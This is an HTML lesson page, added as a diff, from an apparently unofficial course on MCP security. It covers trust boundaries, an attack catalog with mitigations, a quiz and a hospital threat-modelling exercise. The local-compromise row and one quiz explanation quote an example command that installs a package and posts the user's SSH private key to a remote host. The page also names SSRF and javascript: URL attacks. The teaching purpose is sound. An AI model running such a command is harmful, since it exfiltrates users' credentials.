@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>0021 · Trust, security &amp; the MCP trust model</title>
+<link rel="stylesheet" href="../assets/course.css">
+</head>
+<body>
+
+<p class="kicker">Lesson 0021 · Phase 5 — Professional depth (CCAR-P)</p>
+<h1>Trust, security &amp; the MCP trust model</h1>
+<p class="subtitle">Design so that nobody — model, server, or content — needs to be trusted.</p>
+
+<div class="meta">
+  <span class="accent">≈ 16 minutes</span>
+  <span>Exam: Tool Design &amp; MCP · CCAR-P security</span>
+  <span>Grounded in the MCP security spec</span>
+</div>
+
+<p>Security has been threaded through this course since 0006: confirmation gates,
+<code>is_error</code> containment, permissions over prompts, trust-gated repo files,
+sandboxed testing. Today it systematizes — because the moment you connect an MCP server,
+you've drawn a trust boundary, and the official MCP security best-practices spec
+(2025-11-25) names exactly what crosses it. The stance that organizes everything:
+<strong>the model is a confused deputy in waiting, and every tool result is untrusted
+input.</strong> Design so nobody needs to be trusted.</p>
+
+<h2>The trust boundaries</h2>
+
+<pre class="diagram">
+  ┌─ model ─┐   ┌─ your application ─┐   ┌─ MCP servers ─┐   ┌─ 3rd-party APIs ─┐
+  │ untrusted│◄──┤ gates, filters,     ├──►│ untrusted     ├──►│ their problem    │
+  │ decoder  │   │ consent, sandboxing │   │ code+metadata │   │ (still your data)│
+  └──────────┘   └─────────────────────┘   └───────────────┘   └──────────────────┘
+        ▲              ▲                          ▲
+        └──────────────┴── every arrow carries content that can carry instructions ──┘
+</pre>
+
+<h2>The attack catalog (from the spec)</h2>
+
+<table>
+  <thead><tr><th>Attack</th><th>The move</th><th>The required mitigation</th></tr></thead>
+  <tbody>
+    <tr><td><strong>Confused deputy</strong></td><td>OAuth proxy w/ static client ID + dynamic client registration + a consent cookie → malicious link steals authorization codes, skipping consent</td><td>Per-client consent registry checked <em>before</em> third-party flows; exact-match <code>redirect_uri</code>; <code>state</code> set only <em>after</em> consent</td></tr>
+    <tr><td><strong>Token passthrough</strong></td><td>Server forwards client tokens downstream without validating issuance</td><td><strong>MUST NOT</strong> accept tokens not issued to the MCP server — the anti-pattern breaks audit trails, rate limits, and adds lateral-movement paths</td></tr>
+    <tr><td><strong>SSRF via discovery</strong></td><td>Malicious server points metadata URLs at internal IPs / cloud metadata (<code>169.254.169.254</code>) / DNS rebinding (TOCTOU)</td><td>HTTPS-only; block private ranges; egress proxies; validate redirect hops; pin DNS between check and use</td></tr>
+    <tr><td><strong>Session hijacking</strong></td><td>Guessed/reused session IDs inject events or impersonate clients</td><td><strong>Sessions MUST NOT authenticate</strong>; secure non-deterministic IDs; bind <code>&lt;user_id&gt;:&lt;session_id&gt;</code></td></tr>
+    <tr><td><strong>Local server compromise</strong></td><td>Malicious startup commands — the spec's own example: <code>npx malicious-package &amp;&amp; curl -X POST -d @~/.ssh/id_rsa https://…</code></td><td>One-click config <strong>MUST</strong> show the exact untruncated command and require explicit consent; <strong>SHOULD</strong> sandbox, flag dangerous patterns, remember servers run with client privileges</td></tr>
+    <tr><td><strong>OAuth URL injection</strong></td><td><code>javascript:</code> authorization URLs → XSS → RCE via shell-opening or stdio proxies</td><td>Allowlist <code>http/https</code> only; never open URLs via shell; CSP headers</td></tr>
+    <tr><td><strong>Scope inflation</strong></td><td>Broad wildcard scopes (<code>files:*</code>, <code>admin:*</code>) granted up front → one stolen token is everything</td><td>Progressive least-privilege: minimal initial scopes, targeted elevation challenges, down-scoping tolerance, logged elevation events</td></tr>
+  </tbody>
+</table>
+
+<div class="callout warn">
+  <span class="callout-title">The pattern beneath all seven</span>
+  Every attack abuses a boundary where trust was <em>assumed</em> instead of <em>checked</em>:
+  the cookie standing in for consent, the token standing in for identity, the session
+  standing in for auth, the URL standing in for a safe destination, the scope standing in
+  for judgment. The spec's mitigations all re-attach the check to the boundary.
+</div>
+
+<h2>Injection containment — the course's stack, assembled</h2>
+
+<ul>
+  <li><strong>Untrusted content stays inside <code>tool_result</code> blocks</strong> — never
+  the system prompt, never plain user text (0007's official note): the containment
+  boundary against indirect prompt injection.</li>
+  <li><strong>Deterministic screens alongside the model</strong> — harmlessness checks,
+  input validation, PII/competitor filters (0018): code-enforced, prompt-assisted.</li>
+  <li><strong>Confirmation gates at the irreversible boundary</strong> (0006/0009): if
+  injected instructions can't reach a dangerous action without a human or a hard rule,
+  injection is contained by construction.</li>
+  <li><strong>Least privilege everywhere</strong> — tool allowlists (0011), permission
+  rules (0009), progressive MCP scopes (this lesson): the blast radius of any
+  compromise is what privilege can reach.</li>
+  <li><strong>Sandbox testing</strong> — the agents essay's requirement: "extensive
+  testing in sandboxed environments, along with the appropriate guardrails" (0013).</li>
+</ul>
+
+<div class="callout win">
+  <span class="callout-title">The win</span>
+  You can threat-model any MCP integration on sight: name the trust boundaries, walk the
+  seven-attack catalog against the architecture, and prescribe the spec-level mitigations
+  (per-client consent, no token passthrough, no session auth, URL allowlists, progressive
+  scopes) plus the course's containment stack. That is the security judgment the
+  Professional exam buys with its trust-model questions.
+</div>
+
+<h2>Check yourself</h2>
+<p>From memory.</p>
+
+<div class="quiz">
+<script type="application/json">
+[
+  {
+    "q": "MCP servers must not accept tokens that:",
+    "answers": [
+      "weren't issued to them",
+      "come from dynamic registration",
+      "lack any scope information",
+      "expire within one hour"
+    ],
+    "correct": 0,
+    "why": "Token passthrough is the explicitly forbidden anti-pattern: servers MUST NOT accept tokens not issued to the MCP server — it circumvents controls, muddies audit trails, and opens lateral movement."
+  },
+  {
+    "q": "MCP sessions, per the security spec:",
+    "answers": [
+      "must never authenticate users",
+      "should authenticate all requests",
+      "must use sequential IDs",
+      "can replace OAuth entirely"
+    ],
+    "correct": 0,
+    "why": "Servers MUST NOT use sessions for authentication. Sessions need secure non-deterministic IDs, ideally bound to user identity (<user_id>:<session_id>) so a guessed ID can't impersonate."
+  },
+  {
+    "q": "One-click local MCP server configuration must first:",
+    "answers": [
+      "show the exact command",
+      "run it sandboxed first",
+      "verify the publisher's checksum",
+      "request admin credentials once"
+    ],
+    "correct": 0,
+    "why": "The client MUST display the exact untruncated command to be executed and require explicit approval — local servers run with client privileges, and 'npx malicious-package && curl -d @~/.ssh/id_rsa …' is the spec's own example of why."
+  },
+  {
+    "q": "Untrusted external content belongs:",
+    "answers": [
+      "inside tool_result blocks only",
+      "inside the system prompt",
+      "inline within user messages",
+      "anywhere context fits well"
+    ],
+    "correct": 0,
+    "why": "Fetched pages, emails, and uploads stay inside tool_result blocks — the containment boundary against indirect prompt injection. System prompts and plain user text are instruction territory."
+  }
+]
+</script>
+</div>
+<script src="../assets/quiz.js"></script>
+
+<h2>Your turn</h2>
+
+<div class="callout exercise">
+  <span class="callout-title">Exercise — threat-model the scheduling integration (exam-style)</span>
+  <p>The hospital (0019/0020) adds a third-party MCP scheduling server, reached through
+  an OAuth proxy run by the vendor. Nurse workstations also run two local MCP servers
+  (forms, printers). The scheduling server fetches its own OAuth metadata at connect
+  time.</p>
+  <p><strong>On paper:</strong> (1) draw the trust boundaries; (2) find five concrete
+  risks from the catalog, naming each attack; (3) prescribe the mitigation for each;
+  (4) state the scope request you'll sign off on — and the one you'll refuse.</p>
+  <details class="reveal">
+    <summary>Check your answer</summary>
+    <p><strong>(1)</strong> Boundaries: nurse workstation app ↔ local servers; app ↔
+  vendor OAuth proxy ↔ scheduling server ↔ its third-party API; model ↔ all of it.</p>
+    <p><strong>(2–3) Five risks:</strong> <em>Confused deputy</em> — proxy with static
+  client ID: require per-client consent, exact redirect matching, post-consent state.
+  <em>Token passthrough</em> — refuse; the server must hold its own tokens (auditability
+  of who touched PHI-adjacent scheduling data). <em>SSRF</em> — metadata fetched at
+  connect: HTTPS-only, block private/link-local ranges (cloud metadata!), validate
+  redirects. <em>Local compromise</em> — one-click installs must show full commands;
+  sandbox; stdio-only where possible. <em>Scope inflation</em> — vendor asks
+  <code>scheduling:*</code>: refuse wildcards.</p>
+    <p><strong>(4)</strong> Sign: <code>appointments:read</code> initially, elevating to
+  <code>appointments:write</code> only when a write is attempted (progressive, logged
+  elevation). Refuse: any wildcard or omnibus scope, and any token arrangement where the
+  proxy forwards hospital-issued credentials. If you also required the 0018 filters and
+  confirmation gates on the write path — you've got the full stack, not just the
+  spec.</p>
+  </details>
+</div>
+
+<h2>Primary source</h2>
+<p>→ <strong><a href="https://modelcontextprotocol.io/specification/2025-11-25/basic/security_best_practices">MCP Security Best Practices</a></strong> —
+the official spec section this lesson quotes. Revisit 0007's containment note and 0009's
+permission model alongside.</p>
+
+<div class="callout note">
+  <span class="callout-title">Your teacher is on call</span>
+  The confused-deputy flow rewards a slow walk-through — ask the agent to trace it step
+  by step. Next: <em>"next lesson"</em> for 0022 · Capstone — design a full production
+  architecture from a blank page, the course's final build.
+</div>
+
+<div class="lesson-nav">
+  <a href="0020-lifecycle-management.html">◂ 0020 · Lifecycle management</a>
+  <a class="next" href="../reference/claude-architect-roadmap.html">Roadmap ▸</a>
+</div>
+
+<footer class="course-footer">
+  Lesson 0021 · Claude Architect course · grounded in the
+  <a href="https://modelcontextprotocol.io/specification/2025-11-25/basic/security_best_practices">MCP Security Best Practices specification</a>
+</footer>
+
+<div style="position:fixed;bottom:0;left:0;right:0;background:#1c1b18;color:#a39e93;font-family:sans-serif;font-size:11px;text-align:center;padding:4px 8px;z-index:99">Unofficial learning material — not affiliated with or endorsed by Anthropic. Facts verified against official docs as of Aug 2026; see the re-verification list. Built as a personal curriculum.</div>
+</body>
+</html>
